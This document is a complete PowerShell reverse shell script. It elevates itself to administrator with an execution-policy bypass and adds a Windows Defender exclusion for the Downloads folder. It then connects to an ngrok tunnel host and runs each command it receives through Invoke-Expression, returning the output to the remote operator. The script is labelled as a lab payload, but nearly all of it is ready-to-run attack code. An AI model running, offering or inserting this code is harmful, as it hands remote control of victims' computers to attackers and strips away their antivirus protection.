# Check for admin privileges
function Test-Admin {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

# Relaunch the script as admin if not already
function Ensure-Admin {
    if (-not (Test-Admin)) {
        $scriptPath = $MyInvocation.MyCommand.Definition
        Write-Host "[*] Relaunching with admin privileges..." -ForegroundColor Yellow
        Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`""
        exit
    }
}

# Check and relaunch as Windows PowerShell (not PowerShell Core)
function Ensure-WindowsPowerShell {
    if ($PSVersionTable.PSEdition -ne 'Desktop') {
        $script = $MyInvocation.MyCommand.Definition
        Write-Host "[*] Relaunching in Windows PowerShell..." -ForegroundColor Cyan
        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$script`""
        exit
    }
}

# === Entry Point ===
Ensure-Admin
Ensure-WindowsPowerShell

# === Begin Reverse Shell Payload ===
try {
    # Windows Defender exclusion (optional for lab)
    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue

    # === Configure these values for lab environment ===
    $client = "0.tcp.ngrok.io"
    $port = 10976

    # Establish TCP connection
    $tcp = New-Object System.Net.Sockets.TcpClient($client, $port)
    $stream = $tcp.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $buffer = New-Object byte[] 1024

    while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $bytesRead)
        $sendback = (Invoke-Expression $data 2>&1 | Out-String)
        $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
        $writer.Write($sendback2)
        $writer.Flush()
    }

    # Clean up
    $writer.Close()
    $stream.Close()
    $tcp.Close()
}
catch {
    Write-Error "Execution failed: $_"
}
